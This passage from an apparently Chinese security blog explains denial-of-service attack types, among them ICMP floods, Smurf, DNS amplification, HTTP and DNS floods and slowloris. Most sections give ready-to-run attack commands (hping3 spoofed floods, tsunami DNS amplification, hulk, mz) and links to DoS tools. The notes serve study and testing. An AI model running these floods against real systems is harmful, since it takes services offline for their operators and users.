<p>ICMP and IGMP Floods类似于UDP不需要任何漏洞，只需要发送大量的ICMP或IGMP数据包，在处理每一个数据包的时候资源消耗殆尽导致拒绝服务。</p>
<p>测试工具：hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
<h2 id="放大攻击"><a href="#放大攻击" class="headerlink" title="放大攻击"></a>放大攻击</h2><p>利用回复包比请求包大的特点（放大流量），伪造请求包的源IP地址，将应答包引向被攻击的目标。例如：攻击者伪造源IP为目标的IP然后使用路由广播IP地址向多个IP发送消息，然后这些设备都向目标IP进行回应。如图：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos2.jpg" alt=""></p>
<p>想要使用放大攻击必须使用不需要验证源IP的无连接协议，像DNS、ICMP（ Smurf attack）、UDP（Fraggle attack）等协议。</p>
<h3 id="Smurf-Attack"><a href="#Smurf-Attack" class="headerlink" title="Smurf Attack"></a>Smurf Attack</h3><p>攻击者会选择一些中间站点作为放大器，然后发送巨大数量ICMP（ping）请求到这些中间站点的广播IP。通过这种方式，将所有的源IP改为目标的IP地址，这些中间地址将这些数据包广播到所有子网的主机。最后所有主机的回应都发回给目标。</p>
<p>测试工具:hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --icmp --spoof TARGET_IP BROADCAST_IP</div></pre></td></tr></table></figure>
<h3 id="DNS-Amplification"><a href="#DNS-Amplification" class="headerlink" title="DNS Amplification"></a>DNS Amplification</h3><p>当前许多DNS服务器支持EDNS。EDNS是DNS的一套扩大机制，RFC 2671对此有介绍。一些选择能够让DNS回复超过512字节并且仍然使用UDP，如果要求者指出它能够处理这样大的DNS查询的话。攻击者已经利用这种方法产生了大量的通讯。通过发送一个60个字节的查询来获取一个大约4000个字节的记录，攻击者能够把通讯量放大66倍。一些这种性质的攻击已经产生了 每秒钟许多GB的通讯量，对于某些目标的攻击甚至超过了每秒钟10GB的通讯量。<br>下面看两个图，正常的查询:</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos3.jpg" alt=""></p>
<p>下面是放大攻击的图：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos4.jpg" alt=""></p>
<p>对比上面的连个图，发下放大攻击之后有大量的数据查询后的响应数据包返回给受害者的机器，这样就造成了对受害者的拒绝服务攻击。</p>
<p>测试工具：Tsunami</p>
<p>下载地址： <a href="https://www.infosec-ninjas.com/tsunami" target="_blank" rel="external">https://www.infosec-ninjas.com/tsunami</a></p>
<p>测试命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 收集dns服务器 ./tsunami -o recursive_dns.txt -l 4 -e 172.0.0.0/8</div><div class="line"></div><div class="line">2 对目标进行攻击 ./tsunami -s TARGET_IP -n pentest.blog -p 3 -f recursive_dns.txt</div></pre></td></tr></table></figure>
<h3 id="Fraggle-Attack"><a href="#Fraggle-Attack" class="headerlink" title="Fraggle Attack"></a>Fraggle Attack</h3><p>攻击者向UDP端点发送大量的欺骗UDP洪促使这些端口回应目标。</p>
<h2 id="应用层攻击"><a href="#应用层攻击" class="headerlink" title="应用层攻击"></a>应用层攻击</h2><p>应用层攻击也叫第七层攻击，可以实行DoS和DDoS攻击，这种类型的攻击是基于模仿人的行为。</p>
<p>可能被利用的协议包括HTTP、HTTPS、DNS、SMTP、FTP、VOIP和其他的应用协议</p>
<h3 id="HTTP泛洪"><a href="#HTTP泛洪" class="headerlink" title="HTTP泛洪"></a>HTTP泛洪</h3><p>HTTP泛洪是应用层攻击中最常见的攻击方式。</p>
<p>这种类型的攻击可以尝试使用HTTP GET或者POST方式向服务器发出请求。通常来说需要多个电脑同时发出请求。</p>
<p>测试工具：</p>
<p>1 LOIC</p>
<p>2 hulk <a href="http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/" target="_blank" rel="external">http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令:python hulk.py -site http://TARGET.com/test/</div></pre></td></tr></table></figure>
<p>3 Apache JMeter <a href="https://jmeter.apache.org/" target="_blank" rel="external">https://jmeter.apache.org/</a></p>
<h3 id="DNS泛洪"><a href="#DNS泛洪" class="headerlink" title="DNS泛洪"></a>DNS泛洪</h3><p>DNS泛洪像其他洪水攻击一样，DNS泛宏攻击的目的是向DNS应用发送大量DNS请求。DNS服务器不堪重负，无法处理来自其他用户的所有合法请求。</p>
<p>测试工具：</p>
<p>1 mz <a href="http://www.perihel.at/sec/mz/" target="_blank" rel="external">http://www.perihel.at/sec/mz/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：mz -A rand -B TARGET_DNS_SERVER -t dns &quot;q=pentest.blog&quot; -c 10000000</div></pre></td></tr></table></figure>
<p>2 netstressng <a href="https://sourceforge.net/projects/netstressng/" target="_blank" rel="external">https://sourceforge.net/projects/netstressng/</a></p>
<p>命令：netstress.fullrandom -d TARGET_DNS_SERVER -a dns -t a -n 4 -P 53</p>
<h3 id="Low和Slow攻击"><a href="#Low和Slow攻击" class="headerlink" title="Low和Slow攻击"></a>Low和Slow攻击</h3><p>这个攻击不像其他的泛洪攻击，他不需要大量的数据流量。这种类型的攻击针对的是应用程序和服务器资源。</p>
<p>这种方式很难被检测，因为其流量跟正常流量没什么两样。</p>
<p>测试工具：<a href="https://github.com/llaera/slowloris.pl" target="_blank" rel="external">https://github.com/llaera/slowloris.pl</a></p>
<p>这个工具的原理就是通过打开多个连接并保持连接，直到服务器无法处理跟多的http请求，导致拒绝服务。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里说了这么多关于拒绝服务的方式，我知道这些内容并不是很全，而且解释的也比较简单，没有深入去解释各种协议，这些基础的东西就需要大家自行去研究学习。这里只是做一个简要介绍做个笔记。里面涉及的攻击就只能请大家自行测试了 。</p>
<p>原文链接：<a href="https://mp.weixin.qq.com/s/zH_1rHVP2-m-5yhtEGvNCw" target="_blank" rel="external">https://mp.weixin.qq.com/s/zH_1rHVP2-m-5yhtEGvNCw</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
</feed>
